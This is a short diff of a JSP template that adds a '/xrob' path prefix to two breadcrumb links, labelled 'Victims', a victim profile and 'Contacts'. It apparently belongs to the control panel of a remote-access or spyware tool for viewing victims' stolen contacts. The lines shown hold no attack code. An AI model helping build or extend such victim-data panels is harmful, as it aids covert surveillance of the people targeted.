@@ -57,8 +57,8 @@
 
     <div class="row text-center">
         <ul id="nav_menu" class="breadcrumb">
-            <li><a href="/client/panel">Victims</a></li>
-            <li><a href="/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
+            <li><a href="/xrob/client/panel">Victims</a></li>
+            <li><a href="/xrob/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
             </a></li>
             <li class="active">Contacts</li>
         </ul>
